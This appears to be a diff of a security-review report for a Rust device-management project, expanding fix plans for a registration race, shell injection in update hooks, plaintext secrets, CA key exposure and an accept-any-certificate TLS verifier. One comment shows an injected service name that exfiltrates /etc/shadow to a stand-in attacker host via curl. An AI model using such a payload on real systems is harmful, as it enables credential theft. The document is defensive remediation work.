@@ -472,89 +472,453 @@ These aspects demonstrate strong engineering practices:
 
 ## Fix Plans
 
-### FP-CR1: Atomic first-user registration
-
-**Addresses:** CR-1
-
-**Problem:** Two concurrent registrations can both become owner.
-
-**Plan:**
-1. Wrap the entire first-user check + creation + role assignment in a serializable transaction.
-2. Add a unique constraint or advisory lock on "initial setup completed" to prevent races.
-3. Use `SELECT ... FOR UPDATE` on the user count or a dedicated "setup_completed" flag in settings.
-4. As a simpler alternative: use the existing `registration.mode` setting — set it to `Closed` inside the same transaction that creates the first user. The second concurrent request will see `Closed` and fail.
-
-**Files:** `web-api/src/routes/auth.rs`, `web-api/src/routes/oidc_auth.rs`
+> **TOP 5 Priority** — The five most impactful issues are marked with detailed implementation-ready fix plans below. Remaining issues have concise plans.
 
 ---
 
-### FP-CR2: Encrypt sensitive credentials at rest
+### FP-CR1: Atomic first-user registration (TOP 5 — #1)
 
-**Addresses:** CR-2, HI-12
+**Addresses:** CR-1 (Critical — privilege escalation via race condition)
 
-**Problem:** MQTT passwords, OIDC client secrets, and CA private keys are stored as plaintext in the database.
+**Problem:** The first-user registration check uses `User::find().count()` followed by a separate user insert and role assignment with NO transactional isolation. Two concurrent registration requests can both observe `count == 0` and both receive the `owner` role, granting full administrative access to an attacker who races the first legitimate registration.
 
-**Plan:**
-1. Introduce an application-level encryption layer using AES-256-GCM with a master key.
-2. The master key is loaded from an environment variable or file at startup (not stored in DB).
-3. Add `encrypt_secret()` / `decrypt_secret()` helpers that produce `ENC:base64(nonce+ciphertext+tag)` strings.
-4. Apply to: `mqtt_clients.password`, `oidc_providers.client_secret`, `ca_certificates.key_pem`.
-5. Migration: write a migration that encrypts existing plaintext values in-place.
-6. Ensure the encrypted values never appear in logs, API responses, or outbox events.
+Additionally, the password path checks `count == 0` *before* creating the user, while the OIDC path checks `count == 1` *after* creating the user — an inconsistency that creates different race windows.
 
-**Alternative (simpler for MVP):** Use a dedicated secrets table with the encrypted value and a key version, allowing key rotation.
+**Current code flow (password path in `web-api/src/routes/auth.rs:86-136`):**
+```
+1. let user_count = User::find().count(&state.db).await     // read
+2. let is_first_user = user_count == 0                        // decide
+3. new_user.insert(&state.db).await                           // write (separate operation)
+4. if is_first_user { assign_owner_role(&state.db, ...) }     // write (separate operation)
+5. complete_initial_setup(...)                                 // write (separate operation)
+```
 
-**Files:** New `web-api/src/crypto.rs`, migrations, entity files, stores that read/write secrets.
+**Current code flow (OIDC path in `web-api/src/routes/oidc_auth.rs:443-477`):**
+```
+1. resolve_oidc_user() → creates user + assigns "user" role   // write
+2. let is_first_user = User::find().count() == 1              // read (AFTER creation)
+3. if is_first_user { delete "user" role, assign "owner" }    // write (separate)
+4. complete_initial_setup(...)                                 // write (separate)
+```
+
+**Detailed implementation plan:**
+
+1. **Extract a shared `register_first_user()` helper** used by both password and OIDC paths:
+   ```rust
+   /// Atomically registers the first user with owner role.
+   /// Returns Ok(true) if this was the first user, Ok(false) otherwise.
+   async fn register_first_user(
+       db: &DatabaseConnection,
+       tenant_id: Uuid,
+       user_id: Uuid,
+       settings: &SettingsManager,
+   ) -> Result<bool> { ... }
+   ```
+
+2. **Wrap in a serializable transaction:**
+   - `db.begin_with_config(Some(IsolationLevel::Serializable), None).await`
+   - Inside: count users, create user, assign owner role, call `complete_initial_setup` (which sets `registration.mode = Closed` and deletes the invite token).
+   - `txn.commit().await` — if a concurrent transaction already committed, this will fail with a serialization error.
+
+3. **Add a database-level guard:** Add a unique partial index or constraint on `settings(tenant_id, key)` WHERE `key = 'registration.mode'` AND `value = '"Open"'`. This makes `complete_initial_setup`'s `Closed` write act as a natural mutex — the second racer's transaction fails at commit.
+
+4. **Unify the two paths:** Both password and OIDC registration call the same `register_first_user()` helper. The OIDC path no longer creates the user with a "user" role first, then replaces it; instead it calls the helper directly.
+
+5. **Handle the serialization-error retry:** On `DbErr::...` serialization failure, return `409 Conflict` with "Registration is being processed, please retry" instead of a 500.
+
+**Files to modify:**
+- `crates/ui/web-api/src/routes/auth.rs` — extract helper, wrap in transaction
+- `crates/ui/web-api/src/routes/oidc_auth.rs` — use shared helper
+- `crates/ui/web-api/src/auth/authentication.rs` — adjust `resolve_oidc_user` to not assign role if first-user flow will handle it
+- `crates/ui/web-api/src/auth/registration.rs` — make `complete_initial_setup` accept a transaction connection
+
+**Testing:**
+- Unit test: concurrent registration attempts (spawn multiple tasks hitting register simultaneously)
+- Verify only one user gets owner role
+- Verify registration mode switches to Closed atomically
 
 ---
 
-### FP-CR3: Separate CA signing material from metadata
+### FP-HI1: Eliminate command injection in update hooks (TOP 5 — #2)
 
-**Addresses:** CR-3
+**Addresses:** HI-1 (High — stored RCE on remote agents)
 
-**Problem:** `CaSnapshotData` mixes metadata with private keys, shared broadly.
+**Problem:** `resolve_systemd_hook()` and `resolve_docker_compose_hook()` in `web-api/src/update_hooks.rs` directly interpolate admin-configurable strings (`service_name`, `project_dir`, `compose_file`) into shell commands using `format!()`. These commands are executed by agents via `sh -c`. A compromised admin account (or CSRF/XSS leading to admin config change) can inject arbitrary shell commands that execute on every managed agent.
 
-**Plan:**
-1. Split into two structs:
-   - `CaMetadata` — fingerprints, cert PEMs, bundle, pki_addr (safe to share widely)
-   - `CaSigningMaterial` — key PEMs (only where signing is needed)
-2. `AppState` holds `watch::Receiver<CaMetadata>` (all handlers).
-3. `CertSigner` holds `watch::Receiver<CaSigningMaterial>` (only the signer).
-4. The controller's `main.rs` sends to both channels on CA init/rotation.
+**Current vulnerable code:**
+```rust
+// update_hooks.rs:138-140
+fn resolve_systemd_hook(hook: &SystemdServiceHook) -> String {
+    format!("systemctl {} {}", hook.action.as_str(), hook.service_name)
+    // service_name = "nginx; curl attacker.com/$(cat /etc/shadow)"
+    // → "systemctl stop nginx; curl attacker.com/$(cat /etc/shadow)"
+}
 
-**Files:** `web-api/src/lib.rs`, `controller/src/pki.rs`, `controller/src/cert_signer.rs`, `controller/src/crl_manager.rs`
+// update_hooks.rs:143-172
+fn resolve_docker_compose_hook(hook: &DockerComposeHook) -> String {
+    // project_dir and compose_file also directly interpolated
+    parts.push(format!("cd {project_dir}"));
+    compose_cmd.push_str(&format!(" -f {compose_file}"));
+    // ...
+}
+```
+
+**No validation exists** at any layer — the types in `web-api-types/src/update_hooks.rs` accept bare `String` fields, and the API routes in `provider_configs.rs` and `software_items.rs` pass them through without sanitization.
+
+**Detailed implementation plan:**
+
+1. **Switch to structured command execution (primary fix):**
+   Change hook resolution from producing a single shell string to producing a structured `ResolvedCommand`:
+   ```rust
+   pub struct ResolvedCommand {
+       pub program: String,
+       pub args: Vec<String>,
+       pub working_dir: Option<String>,
+   }
+   ```
+   - `resolve_systemd_hook` → `ResolvedCommand { program: "systemctl", args: vec![action, service_name], working_dir: None }`
+   - `resolve_docker_compose_hook` → `ResolvedCommand { program: "docker-compose", args: vec!["-f", compose_file, action, ...], working_dir: Some(project_dir) }`
+
+2. **Update the wire protocol** to transmit `ResolvedCommand` instead of a bare string. The agent executes via `Command::new(program).args(args).current_dir(working_dir)` — never via `sh -c`.
+
+3. **Add input validation at the API boundary** (defense in depth):
+   Add a `validate_hook_params()` function in `web-api-types/src/update_hooks.rs`:
+   ```rust
+   /// Validates hook parameters reject shell metacharacters.
+   /// Allowed: alphanumeric, `-`, `_`, `.`, `/` (for paths).
+   fn validate_safe_identifier(value: &str, field: &str) -> Result<()> {
+       if value.is_empty() { return Err(...) }
+       if value.len() > 255 { return Err(...) }
+       let forbidden = [';', '&', '|', '$', '`', '(', ')', '{', '}', '<', '>', '\'', '"', '\\', '\n', '\r', '\0'];
+       if value.chars().any(|c| forbidden.contains(&c)) {
+           return Err(format!("{field} contains forbidden characters"));
+       }
+       Ok(())
+   }
+   ```
+   - Apply to `service_name` (stricter: only `[a-zA-Z0-9._@-]`, matching systemd unit name rules)
+   - Apply to `project_dir` and `compose_file` (path characters only: `[a-zA-Z0-9._/-]`)
+
+4. **Call validation in API routes:**
+   - `crates/ui/web-api/src/routes/provider_configs.rs` — validate hook params in `create_provider_config` and `update_provider_config`
+   - `crates/ui/web-api/src/routes/software_items.rs` — validate hook params in `create_software_item` and `update_software_item` (config override)
+
+5. **Agent-side change:** Update agent's command executor to use `Command::new()` with the structured args instead of `sh -c <string>`.
+
+**Files to modify:**
+- `crates/ui/web-api/src/update_hooks.rs` — new `ResolvedCommand` struct, rewrite resolution functions
+- `crates/shared/web-api-types/src/update_hooks.rs` — add validation functions
+- `crates/shared/wire/src/lib.rs` — update wire message to carry structured commands
+- `crates/ui/web-api/src/routes/provider_configs.rs` — call validation
+- `crates/ui/web-api/src/routes/software_items.rs` — call validation, update trigger_update
+- `crates/core/agent/` — update command executor
+- `crates/shared/wire/asyncapi.yaml` — update schema
+
+**Testing:**
+- Unit test: validation rejects `;`, `|`, `$()`, backticks, etc.
+- Unit test: `ResolvedCommand` produces correct program/args
+- Integration test: hook execution with special characters is safely handled
 
 ---
+
+### FP-CR2: Encrypt sensitive credentials at rest (TOP 5 — #3)
+
+**Addresses:** CR-2 (Critical — MQTT password exposure), HI-12 (High — OIDC secret exposure)
+
+**Problem:** Three categories of secrets are stored as plaintext strings in the database:
+- `mqtt_clients.password` (`Option<String>`) — MQTT broker credentials
+- `oidc_providers.client_secret` (`String`) — OIDC client secrets
+- `ca_certificates.key_pem` (`String`) — CA private keys (PEM)
+
+A database compromise (SQL injection in a dependency, backup leak, stolen disk) exposes all secrets. MQTT passwords are also transmitted in plaintext JSON over WebSocket in `MqttTenantConfig` messages and serialized into the `controller_events` outbox table.
+
+**Detailed implementation plan:**
+
+1. **Create a `SecretString` newtype** in the `db` crate:
+   ```rust
+   /// A string that is encrypted at rest in the database.
+   /// Stored as `ENC:v1:<base64(nonce ‖ ciphertext ‖ tag)>`.
+   /// Implements `Display` as `***REDACTED***` to prevent accidental logging.
+   #[derive(Clone)]
+   pub struct SecretString(String);
+
+   impl std::fmt::Debug for SecretString {
+       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+           f.write_str("SecretString(***)")
+       }
+   }
+
+   impl std::fmt::Display for SecretString {
+       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+           f.write_str("***REDACTED***")
+       }
+   }
+   ```
+
+2. **Implement encryption module** (`crates/shared/db/src/crypto.rs` or a new shared crate):
+   - Algorithm: AES-256-GCM (via the `aes-gcm` crate, already widely audited)
+   - Master key: 32-byte key loaded from `UPTRAKIT_MASTER_KEY` env var or `--master-key-file` path at startup
+   - Format: `ENC:v1:<base64(12-byte-nonce ‖ ciphertext ‖ 16-byte-tag)>`
+   - Functions:
+     ```rust
+     pub fn encrypt(master_key: &[u8; 32], plaintext: &str) -> String
+     pub fn decrypt(master_key: &[u8; 32], stored: &str) -> Result<String>
+     pub fn is_encrypted(stored: &str) -> bool  // checks "ENC:v1:" prefix
+     ```
+
+3. **Implement SeaORM `Value` conversion** for `SecretString`:
+   - `From<SecretString> for Value` → calls `encrypt()` before storing
+   - `TryGetable for SecretString` → calls `decrypt()` after reading
+   - This makes encryption transparent to all entity code
+
+4. **Update entity models:**
+   - `mqtt_client.rs`: Change `password: Option<String>` to `password: Option<SecretString>`
+   - `oidc_provider.rs`: Change `client_secret: String` to `client_secret: SecretString`
+   - `ca_certificate` entity (if one exists) or the CA store: Change `key_pem: String` to `key_pem: SecretString`
+
+5. **Write a migration** to encrypt existing plaintext values:
+   - Read all rows with plaintext secrets
+   - Encrypt each with the master key
+   - Update in-place
+   - If `UPTRAKIT_MASTER_KEY` is not set, the migration logs a warning and skips (allowing read-only/dev mode without encryption)
+
+6. **Update wire protocol:** Ensure `MqttTenantConfig.password` is decrypted before being sent to the MQTT service (the wire message goes over mTLS, so plaintext in-transit is acceptable for the mTLS channel).
+
+7. **Ensure secrets never appear in:**
+   - API responses (already masked — verify)
+   - `controller_events` outbox table (audit the event serialization)
+   - Tracing/log output (the `Debug`/`Display` impls prevent this)
+
+**Files to modify:**
+- New: `crates/shared/db/src/crypto.rs` (encryption module)
+- `crates/shared/db/src/entity/mqtt_client.rs` — `SecretString` field
+- `crates/shared/db/src/entity/oidc_provider.rs` — `SecretString` field
+- `crates/shared/db/Cargo.toml` — add `aes-gcm`, `base64` dependencies
+- `crates/core/controller/src/main.rs` — load master key at startup
+- `crates/ui/web-api/src/mqtt_lease_coordinator.rs` — decrypt before wire transmission
+- New migration for encrypting existing data
+- All stores that read/write these fields (should work transparently via SeaORM)
+
+**Testing:**
+- Unit test: round-trip encrypt/decrypt
+- Unit test: `SecretString` Debug/Display never reveals plaintext
+- Unit test: `is_encrypted` correctly identifies encrypted vs plaintext
+- Integration test: create MQTT client with password → verify DB stores encrypted value → verify API returns working password
+
+---
+
+### FP-CR3: Separate CA signing material from metadata (TOP 5 — #4)
+
+**Addresses:** CR-3 (Critical — CA private key exposure surface)
+
+**Problem:** `CaSnapshotData` is a single struct containing both public metadata (fingerprints, cert PEMs, bundle, pki_addr) and private secrets (`active_key_pem`, `previous_key_pem`, `trusted_cas[].key_pem`). This struct is broadcast via a `tokio::sync::watch` channel to every component that holds a receiver — including `AppState` which is `Arc`-shared with all HTTP handlers via Axum's state extraction.
+
+The current data flow:
+```
+pki.rs::to_snapshot()
+  → watch::channel(CaSnapshotData)      ← contains ALL private keys
+     ├── AppState.ca_snapshot            ← every HTTP handler can read private keys
+     ├── CertSigner.ca_rx               ← needs active key only
+     └── CrlManager                     ← needs all trusted keys for CRL signing
+```
+
+If any API handler accidentally calls `serde_json::to_string(&snapshot)`, or if a future developer adds debug logging, all CA private keys leak.
+
+**Detailed implementation plan:**
+
+1. **Split into two structs:**
+   ```rust
+   /// Safe to share with all components. No secret material.
+   pub struct CaMetadata {
+       pub active_cert_pem: String,
+       pub active_fingerprint: String,
+       pub previous_cert_pem: Option<String>,
+       pub previous_fingerprint: Option<String>,
+       pub trusted_ca_certs: Vec<TrustedCaCert>,  // cert + fingerprint only, NO key
+       pub trusted_ca_cns: Vec<String>,
+       pub bundle_pem: String,
+       pub bundle_hash: String,
+       pub managed: bool,
+       pub active_not_after: time::OffsetDateTime,
+       pub pki_addr: Option<String>,
+   }
+
+   pub struct TrustedCaCert {
+       pub cert_pem: String,
+       pub fingerprint: String,
+       pub not_after: time::OffsetDateTime,
+   }
+
+   /// Secret material. Only accessible to signing components.
+   pub struct CaSigningKeys {
+       pub active_key_pem: String,
+       pub trusted_keys: Vec<TrustedCaKey>,  // fingerprint → key mapping
+   }
+
+   pub struct TrustedCaKey {
+       pub fingerprint: String,
+       pub key_pem: String,
+       pub cert_pem: String,  // needed to build Issuer
+       pub not_after: time::OffsetDateTime,
+   }
+   ```
+
+2. **Create two separate watch channels in `main.rs`:**
+   ```rust
+   let (ca_meta_tx, ca_meta_rx) = watch::channel(ca_metadata);
+   let (ca_keys_tx, ca_keys_rx) = watch::channel(ca_signing_keys);
+   ```
+
+3. **Update `AppState`** to only hold the metadata receiver:
+   ```rust
+   pub struct AppState {
+       pub ca_metadata: watch::Receiver<CaMetadata>,  // NO private keys
+       // ...
+   }
+   ```
+
+4. **Update `CertSigner`** to hold the signing keys receiver:
+   ```rust
+   pub struct RcgenAgentCertSigner {
+       ca_keys: watch::Receiver<CaSigningKeys>,
+   }
+   ```
+
+5. **Update `CrlManager`** to take signing keys directly:
+   - Constructor: `CrlManager::new(config, &ca_metadata, &ca_signing_keys)` — parses keys into `Issuer` objects immediately
+   - `update_ca()` method: accepts `(&CaMetadata, &CaSigningKeys)` pair
+
+6. **Update `pki.rs`:**
+   - Replace `to_snapshot()` with `to_metadata()` + `to_signing_keys()`
+   - Update all broadcast sites (CA reload task, CA rotation task) to send to both channels
+
+7. **Update HTTP handlers** that currently access `state.ca_snapshot`:
+   - Any handler reading cert PEMs, fingerprints, bundle → use `state.ca_metadata`
+   - No handler should need private keys
+
+8. **Remove `Serialize` from `CaSigningKeys`** (if present) to make accidental serialization a compile error.
+
+**Files to modify:**
+- `crates/ui/web-api/src/lib.rs` — split `CaSnapshotData`, update `AppState`
+- `crates/core/controller/src/pki.rs` — split `to_snapshot()`, update broadcast
+- `crates/core/controller/src/cert_signer.rs` — use `CaSigningKeys`
+- `crates/core/controller/src/crl_manager.rs` — accept split types
+- `crates/core/controller/src/main.rs` — create two channels, wire up
+
+**Testing:**
+- Compile-time: verify `CaSigningKeys` has no `Serialize` impl
+- Unit test: `CaMetadata` contains no `key_pem` fields
+- Existing cert signing and CRL tests should pass with the split
+
+---
+
+### FP-CR5: Strengthen TOFU with signature verification and fingerprint pinning (TOP 5 — #5)
+
+**Addresses:** CR-5 (Critical — MITM during enrollment)
+
+**Problem:** The `AcceptAnyCert` verifier in `enrollment/src/tls.rs:115-174` unconditionally returns success for `verify_server_cert`, `verify_tls12_signature`, AND `verify_tls13_signature`. This doesn't just skip certificate chain validation — it also bypasses handshake signature verification, meaning an attacker doesn't even need a valid private key to impersonate the server. During `--tofu` enrollment, a MITM can inject a rogue CA certificate, compromising all subsequent mTLS connections.
+
+Additionally, the CLI client (`crates/ui/cli/src/client.rs:13`) has a hardcoded `tls_danger_accept_invalid_certs(true)` that is always active — not just for TOFU.
+
+**Current `AcceptAnyCert` code:**
+```rust
+impl ServerCertVerifier for AcceptAnyCert {
+    fn verify_server_cert(...) -> Result<ServerCertVerified, Error> {
+        Ok(ServerCertVerified::assertion())  // accepts ANY cert
+    }
+    fn verify_tls12_signature(...) -> Result<HandshakeSignatureValid, Error> {
+        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
+    }
+    fn verify_tls13_signature(...) -> Result<HandshakeSignatureValid, Error> {
+        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
+    }
+}
+```
+
+**Detailed implementation plan:**
+
+1. **Replace `AcceptAnyCert` with `TofuVerifier`** that validates signatures but not chain:
+   ```rust
+   #[derive(Debug)]
+   struct TofuVerifier;
+
+   impl ServerCertVerifier for TofuVerifier {
+       fn verify_server_cert(
+           &self, end_entity: &CertificateDer<'_>, _intermediates: &[CertificateDer<'_>],
+           _server_name: &ServerName<'_>, _ocsp: &[u8], _now: UnixTime,
+       ) -> Result<ServerCertVerified, Error> {
+           // Accept any certificate (we don't know the CA yet)
+           // BUT we DO verify the TLS handshake signatures below
+           Ok(ServerCertVerified::assertion())
+       }
+
+       fn verify_tls12_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
+           // Delegate to the default WebPKI verifier for signature math
+           rustls::crypto::ring::default_provider()
+               .verify_tls12_signature(message, cert, dss)
+       }
+
+       fn verify_tls13_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
+           rustls::crypto::ring::default_provider()
+               .verify_tls13_signature(message, cert, dss)
+       }
+   }
+   ```
+   This ensures the server actually holds the private key for the certificate it presents, preventing passive MITM.
+
+2. **Add CA certificate fingerprint logging and verification:**
+   After fetching the CA cert via TOFU, compute and display its SHA-256 fingerprint:
+   ```rust
+   let fingerprint = sha256_fingerprint(&ca_pem);
+   tracing::warn!(
+       "TOFU: accepted CA certificate with fingerprint SHA256:{}",
+       fingerprint
+   );
+   tracing::warn!(
+       "TOFU: verify this fingerprint matches your controller's CA"
+   );
+   ```
+
+3. **Add `--tofu-fingerprint <SHA256:hex>` optional flag:**
+   ```rust
+   #[arg(long, requires = "tofu")]
+   pub tofu_fingerprint: Option<String>,
+   ```
+   When provided, after fetching the CA cert, verify the fingerprint matches. If it doesn't, abort enrollment with an error. This provides SSH-like `known_hosts` behavior.
+
+4. **Fix the CLI client** (`crates/ui/cli/src/client.rs`):
+   - Remove the hardcoded `tls_danger_accept_invalid_certs(true)`
+   - Add a `--insecure` flag (off by default) to opt in to insecure TLS
+   - When no `--insecure` flag, use system trust store or a configured CA cert
+
+5. **Add a deprecation path for `--tofu` without fingerprint:**
+   - Log a prominent warning when `--tofu` is used without `--tofu-fingerprint`
+   - Document that `--tofu-fingerprint` is the recommended approach
+
+**Files to modify:**
+- `crates/shared/enrollment/src/tls.rs` — replace `AcceptAnyCert` with `TofuVerifier`
+- `crates/shared/enrollment/src/ca.rs` — add fingerprint display and verification
+- `crates/shared/enrollment/src/cli.rs` — add `--tofu-fingerprint` arg
+- `crates/ui/cli/src/client.rs` — remove hardcoded insecure TLS, add `--insecure` flag
+- `crates/core/agent/src/main.rs` — pass `tofu_fingerprint` to `bootstrap_ca`
+
+**Testing:**
+- Unit test: `TofuVerifier` rejects invalid signatures
+- Unit test: `TofuVerifier` accepts valid self-signed cert with correct signature
+- Unit test: fingerprint mismatch aborts enrollment
+- Integration test: TOFU enrollment succeeds with correct fingerprint
+
+---
+
+### Remaining Fix Plans (concise)
 
 ### FP-CR4: Restrict tenant context header
 
 **Addresses:** CR-4
 
-**Problem:** `X-Tenant-Id` header accepted from any client without authorization.
-
-**Plan:**
-1. **Immediate (single-tenant mode):** Ignore the `X-Tenant-Id` header entirely. Always use `default_tenant_id`. Log a warning if the header is present.
-2. **Future (multi-tenant mode):** Validate that the authenticated user has access to the requested tenant before accepting the header. Unauthenticated endpoints always use the default tenant.
+**Plan:** Ignore `X-Tenant-Id` header entirely in single-tenant mode. Always use `default_tenant_id`. Log a warning if the header is present.
 
 **Files:** `web-api/src/middleware/tenant_context.rs`
-
----
-
-### FP-CR5: Strengthen TOFU with fingerprint pinning
-
-**Addresses:** CR-5
-
-**Problem:** TOFU mode accepts any certificate without even verifying signatures.
-
-**Plan:**
-1. Replace the full bypass with a fingerprint-based approach:
-   - On first connection, accept the server cert, compute its SHA-256 fingerprint, display it to the user, and save it.
-   - On subsequent connections, verify the fingerprint matches.
-2. Alternatively, at minimum verify TLS handshake signatures (keep cert verification off but ensure the handshake is cryptographically valid).
-3. Add a prominent runtime warning when `--tofu` is used.
-4. Consider requiring interactive confirmation (`--tofu` prints fingerprint, user must confirm).
-
-**Files:** `enrollment/src/tls.rs`, `enrollment/src/ca.rs`
 
 ---
 
@@ -562,30 +926,9 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** CR-6
 
-**Problem:** Logout is outside the `require_auth` middleware group.
+**Plan:** Move `logout` route into the `auth_routes` group. Validate the refresh token belongs to the authenticated user's session.
 
-**Plan:**
-1. Move the `logout` route into the `auth_routes` group (which has `require_auth` middleware).
-2. Validate that the refresh token being revoked belongs to the authenticated user's session.
-3. Alternatively, keep logout public but require the refresh token to match a session owned by the user identified by the accompanying access token.
-
-**Files:** `web-api/src/lib.rs` (router), `web-api/src/routes/auth.rs`
-
----
-
-### FP-HI1: Sanitize hook parameters
-
-**Addresses:** HI-1
-
-**Problem:** Shell command injection via `service_name`, `project_dir`, `compose_file`.
-
-**Plan:**
-1. Add a validation function for hook parameters that rejects shell metacharacters: `;`, `&`, `|`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `\n`, `\r`, etc.
-2. Apply validation at the API layer (when creating/updating provider configs and software items).
-3. Use `shell-words::quote()` or manual quoting when constructing commands.
-4. Consider switching from string interpolation to argument arrays passed to `Command::new()` directly, bypassing the shell entirely.
-
-**Files:** `web-api/src/update_hooks.rs`, `web-api/src/routes/provider_configs.rs`, `web-api/src/routes/software_items.rs`
+**Files:** `web-api/src/lib.rs`, `web-api/src/routes/auth.rs`
 
 ---
 
@@ -593,13 +936,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** HI-2
 
-**Problem:** Service merge performs multiple DB operations without a transaction.
-
-**Plan:**
-1. Open a `db.begin()` transaction at the start of `merge_service()`.
-2. Execute all operations (deactivate source, revoke certs, update target, copy host links) within the transaction.
-3. Only `txn.commit()` at the end.
-4. On any error, the transaction auto-rolls back, leaving the database in its original state.
+**Plan:** Wrap the entire merge operation in `db.begin()` / `txn.commit()`. On error, auto-rollback preserves consistency.
 
 **Files:** `web-api/src/routes/services.rs`
 
@@ -609,12 +946,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** HI-4
 
-**Problem:** No maximum enforcement on agent certificate lifetime.
-
-**Plan:**
-1. Add a `MAX_AGENT_CERT_LIFETIME_DAYS` constant (e.g., 730 days / 2 years).
-2. In `sign_agent_csr()`, clamp the requested lifetime to the maximum.
-3. Log a warning if the requested lifetime exceeds the cap.
+**Plan:** Add `MAX_AGENT_CERT_LIFETIME_DAYS = 730`. Clamp requested lifetime in `sign_agent_csr()`. Log warning on cap.
 
 **Files:** `controller/src/cert_signer.rs`
 
@@ -624,14 +956,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** HI-8, HI-9
 
-**Problem:** Missing and inconsistent foreign key behaviors.
-
-**Plan:**
-1. Add a migration that:
-   - Adds `ON DELETE CASCADE` to `service_certificates.service_id -> services` (or `RESTRICT` with documentation — but it must be explicit).
-   - Adds FK from `service_certificates.ca_fingerprint` to `ca_certificates.fingerprint`.
-   - Normalizes `mqtt_leases.tenant_id` to `RESTRICT` (matching all other tenant FKs).
-2. Add a unique constraint on `mqtt_leases.mqtt_client_id` to prevent duplicate lease assignments.
+**Plan:** Migration to add explicit `ON DELETE` to `service_certificates.service_id`, FK from `service_certificates.ca_fingerprint` to `ca_certificates.fingerprint`, unique constraint on `mqtt_leases.mqtt_client_id`.
 
 **Files:** New migration file.
 
@@ -641,11 +966,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** HI-10
 
-**Problem:** `load_host_agents` queries agents without tenant scoping.
-
-**Plan:**
-1. Accept `tenant_id` as a parameter in `load_host_agents()`.
-2. Join through `service_hosts` to `services` and filter `services.tenant_id = ?`.
+**Plan:** Accept `tenant_id` in `load_host_agents()`. Join through `service_hosts` → `services` and filter `services.tenant_id`.
 
 **Files:** `web-api/src/routes/hosts.rs`
 
@@ -655,11 +976,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** HI-11
 
-**Problem:** Token refresh has no rate limiting.
-
-**Plan:**
-1. Add `/api/v1/auth/refresh` to the `RATE_LIMITS` HashMap in `middleware/rate_limit.rs` with a limit of 10 req/min/IP.
-2. Also add `/api/v1/auth/device/approve` with 5 req/min/IP to address ME-5.
+**Plan:** Add `/api/v1/auth/refresh` (10 req/min/IP) and `/api/v1/auth/device/approve` (5 req/min/IP) to `RATE_LIMITS`.
 
 **Files:** `web-api/src/middleware/rate_limit.rs`
 
@@ -669,12 +986,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** ME-1
 
-**Problem:** Stolen refresh tokens remain usable for 7 days.
-
-**Plan:**
-1. On each token refresh: revoke the old session, create a new session with a new refresh token.
-2. Return the new refresh token in the response.
-3. If a revoked refresh token is used (replay detection), revoke ALL sessions for that user as a safety measure.
+**Plan:** On refresh: revoke old session, create new session with new token. On revoked token reuse: revoke all user sessions (replay detection).
 
 **Files:** `web-api/src/auth/session.rs`, `web-api/src/routes/auth.rs`
 
@@ -684,11 +996,7 @@ These aspects demonstrate strong engineering practices:
 
 **Addresses:** ME-2
 
-**Problem:** OIDC auto-link trusts email without verification.
-
-**Plan:**
-1. In the `AutoLink` branch, check the `email_verified` claim from the OIDC provider's userinfo/ID token.
-2. If `email_verified` is `false` or absent, do NOT auto-link. Instead, require explicit account linking through the existing `AccountLinkStore` flow.
+**Plan:** In the `AutoLink` branch, check `email_verified` claim. If false or absent, require explicit `AccountLinkStore` flow.
 
 **Files:** `web-api/src/auth/authentication.rs`
 
